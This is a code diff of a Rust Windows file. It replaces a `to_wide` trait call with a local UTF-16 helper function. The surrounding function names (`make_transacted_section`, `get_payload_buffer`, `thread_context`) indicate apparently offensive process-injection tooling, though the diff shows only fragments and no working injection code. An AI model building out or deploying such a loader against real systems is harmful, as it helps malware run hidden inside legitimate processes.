@@ -4,15 +4,16 @@
 
 extern crate alloc;
 
+use alloc::vec::Vec;
 use core::ffi::c_void;
 use core::hint::spin_loop;
+use core::iter::once;
 use core::mem::zeroed;
 use core::ops::Deref;
 use core::ptr::{copy_nonoverlapping, null, null_mut};
+use filesystem::path::Path;
 use filesystem::storage::StorageFileSystem;
 use filesystem::FileSystem;
-use utils::path::Path;
-use utils::WideString;
 use windows_sys::core::{PCWSTR, PWSTR};
 use windows_sys::Win32::Foundation::{
     CloseHandle, BOOL, FALSE, GENERIC_READ, GENERIC_WRITE, HANDLE, INVALID_HANDLE_VALUE, NTSTATUS,
@@ -137,7 +138,7 @@ pub fn make_transacted_section<S>(
 where
     S: AsRef<str>,
 {
-    let dummy_name = dummy_name.as_ref().to_wide();
+    let dummy_name = to_wide(dummy_name.as_ref());
 
     let options = 0u32;
     let isolation_lvl = 0u32;
@@ -221,8 +222,8 @@ where
     C: AsRef<str>,
     S: AsRef<str>,
 {
-    let mut cmd_line = cmd_line.as_ref().to_wide();
-    let mut start_dir = start_dir.as_ref().to_wide();
+    let mut cmd_line = to_wide(cmd_line.as_ref());
+    let mut start_dir = to_wide(start_dir.as_ref());
 
     let mut si: STARTUPINFOW = unsafe { zeroed() };
     si.cb = size_of::<STARTUPINFOW>() as u32;
@@ -285,7 +286,7 @@ pub fn get_payload_buffer<S>(filename: S) -> Option<(PByte, usize)>
 where
     S: AsRef<str>,
 {
-    let filename = filename.as_ref().to_wide();
+    let filename = to_wide(filename.as_ref());
     let file = unsafe {
         CreateFileW(
             filename.as_ptr(),
@@ -345,6 +346,10 @@ where
     }
 
     Some((local_copy_address, payload_size))
+}
+
+fn to_wide(str: &str) -> Vec<u16> {
+    str.encode_utf16().chain(once(0)).collect()
 }
 
 fn thread_context(pi: &PROCESS_INFORMATION) -> Option<CONTEXT> {
